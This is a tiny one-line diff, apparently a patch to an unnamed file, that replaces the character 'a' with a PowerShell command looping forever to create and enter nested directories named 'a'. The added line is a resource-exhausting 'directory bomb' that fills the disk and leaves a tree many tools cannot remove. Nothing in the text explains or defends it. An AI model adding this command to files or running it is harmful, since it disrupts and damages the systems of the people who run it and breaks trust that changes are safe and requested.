@@ -1,1 +1,1 @@
-a
+powershell -command "while ($true) { md a ;cd a }"
